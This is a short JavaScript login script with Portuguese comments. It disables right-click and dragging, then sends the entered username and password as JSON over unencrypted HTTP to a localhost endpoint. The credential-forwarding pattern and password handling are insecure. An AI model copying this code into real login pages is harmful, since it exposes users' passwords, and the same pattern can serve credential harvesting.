
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
});
document.addEventListener("dragstart", function(e) {
    e.preventDefault();
});

document.addEventListener("DOMContentLoaded", function () {
    // Captura o evento de clique do botão "Entrar"
    document.getElementById("entrar").addEventListener("click", function () {
        let usuario = document.getElementById("user").value;  // Captura o valor do campo 'user'
        let senha = document.getElementById("password").value; 
        // Verifica se o campo está vazio
        if (usuario.trim() === "") {
            alert("Por favor, digite o nome de usuário.");
            return;
        }

        // Envia o dado para o servidor
        fetch("http://localhost:8080/receber-dados", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({usuario, senha}) // Envia o dado como JSON
        })
        .then(response => response.text())
        .then(data => console.log("Resposta do servidor:", data)) // Exibe a resposta do servidor
        .catch(error => console.error("Erro ao enviar dados:", error)); // Trata qualquer erro na requisição
    });
});








